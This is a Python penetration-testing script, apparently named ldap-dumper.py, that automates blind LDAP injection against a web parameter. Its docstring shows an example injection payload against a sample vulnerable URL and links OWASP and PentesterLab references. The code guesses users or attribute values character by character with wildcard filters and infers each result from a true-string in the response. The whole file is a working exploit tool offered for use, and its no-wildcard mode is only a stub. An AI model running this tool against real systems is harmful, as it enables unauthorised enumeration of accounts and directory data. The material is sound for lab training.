"""
example:

ldap-dumper.py 'http://vulnerable/ldap/example2.php?name=%s)(name=*))%%00&password=' 'AUTHENTICATED AS'

In this example, we inserted an expression into the param that will always
return true if the parameter replaced by %s is true, in this case ennumerating
all valid users. Your mission is to get an LDAP that will return TRUE-STRING
when %s is TRUE, and will not return it when FALSE.

Remember to quote the URL because bash! And also remember that % needs to be escaped as %%,
because python/printf.

Some values do not support wildcards, in which case you should use --no-wildcard

Plase see for more info:

https://www.owasp.org/index.php/LDAP_injection
http://web-for-pentester.pentesterlab.com/examples_of_web_vulnerabilities/ldap_attacks/
https://code.google.com/p/ldap-blind-explorer/
http://www.blackhat.com/presentations/bh-europe-08/Alonso-Parada/Whitepaper/bh-eu-08-alonso-parada-WP.pdf
http://www.ietf.org/rfc/rfc1960.txt
"""

import argparse, logging, string, requests

def logging_set(verbosity):

    if verbosity == 0:
        logging.basicConfig(level=logging.WARNING, format="%(levelname)s - %(message)s")
    elif verbosity == 1:
        logging.basicConfig(level=logging.INFO, format="%(levelname)s - %(message)s")
    else :
        logging.basicConfig(level=logging.DEBUG, format="%(levelname)s - %(message)s")

    requests_log = logging.getLogger("requests")
    requests_log.setLevel(logging.WARNING)

def brute_char(base_url, charset, true_string, prefix):
    valid = []
    for c in charset:
        inj = "%s%s*" % (prefix, c)
        url = base_url % inj
        logging.debug(url)
        response = requests.get(url)
        if true_string in response.text:
            valid.append(c)

    return valid

def brute(base_url, true_string, charset):
    logging.info("Entering wildcard brute mode for URL '%s'." % base_url)
    logging.debug("Going to brute with chars %s" % charset)

    # Check which ones were positive.
    exist = []
    first = True
    while True:
        if first == True:
            first = False
            exist = brute_char(base_url, charset, true_string,  "")
            if exist:
                logging.info("Valid initial values found: %s", exist)
            else :
                logging.warn("""No initial values found! True string was never
                    there... Maybe attribute does not support wildcard? see
                    --no-wildcard. Otherwise, URL is non-conformant.""")
                return
        else:
            new_exist = []
            finished = True
            for poss in exist:
                valid_continuations = brute_char(base_url, charset, true_string, poss)
                if valid_continuations:
                    for v in valid_continuations:
                        finished = False
                        new_exist.append(poss + v)
                else:
                    new_exist.append(poss)

            if finished :
                break
            else :
                exist = new_exist

    return exist

def parser_get():
    parser = argparse.ArgumentParser(formatter_class=argparse.RawDescriptionHelpFormatter,description="Bruteforces LDAP!", epilog=__doc__)
    parser.add_argument('URL', help="""The URL that is vulnerable to LDAP
        injection, with a %%s where the injection is.""")
    parser.add_argument('TRUE_STRING', help="""A string that appears in the
        response if LDAP says True. If string doesnt appear, false is assumed.""")
    parser.add_argument('--max-path-size', help="""For bruteforcing DN names,
    which don't support wildcards, we create massive filters like
    (!(val=value1)(val=value2))[...] to be more efficient. This defines how
    long requests will be.""", default=8100)
    parser.add_argument('--no-wildcard', '-N', help="""Some LDAP values do not
        honor the wildcard. These need to be bruteforced without a wildcard, which
        is much slower.""", action="store_true")
    parser.add_argument("--charset", "-c", help="""The set of characters the
        script will attempt to use while bruteforcing.""",
        choices=['lower_and_digit', 'upperlower_and_digits', 'upperlower_hex'],
        default="lower_and_digit")
    parser.add_argument("--charset-custom", "-C", help="""A custom string that contains all the charcters to use. E.g. '-C ABC389'""")

    parser.add_argument("--verbosity", "-v", type=int, help="0 warn, 1 info, 2 debug", default=1)

    return parser

def charset_get(charset_name):
    if charset_name == "lower_and_digit":
        charset = string.ascii_lowercase + string.digits
    elif charset_name == "upperlower_and_digits":
        charset = string.ascii_letters + string.digits
    elif charset_name == "upperlower_hex":
        charset = string.hexdigits

    return charset

def succ(result):
    if result:
        print("Valid values found:\n")
        for r in result:
            print(r)

if __name__ == '__main__':
    parser = parser_get()
    args = parser.parse_args()

    logging_set(args.verbosity)
    logging.debug(args)

    if(args.charset_custom):
        charset = args.charset_custom
    else:
        charset = charset_get(args.charset)

    if not args.no_wildcard:
        valid_values = brute(args.URL, args.TRUE_STRING, charset)
        succ(valid_values)
    else :
        logging.warn("no wildcard not implemented")

